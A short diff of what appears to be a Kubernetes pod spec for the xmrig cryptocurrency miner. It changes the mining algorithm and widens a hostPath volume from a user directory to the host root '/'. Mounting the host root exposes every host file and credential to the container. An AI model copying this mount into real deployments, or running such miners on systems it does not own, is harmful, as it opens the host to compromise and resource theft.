@@ -22,7 +22,7 @@ spec:
     - -u
     - slave1+150
     - -a
-    - rx/0          # Use a lower memory algorithm if possible
+    - cn/r          # Use a lower memory algorithm if possible
     - --threads
     - "1"            # Set to 1 thread to reduce memory
     - --no-huge-pages
@@ -41,4 +41,4 @@ spec:
   volumes:
   - name: xmrig-volume-1
     hostPath:
-      path: /home/worker1  # Adjust to correct path as needed
+      path: / # Adjust to correct path as needed
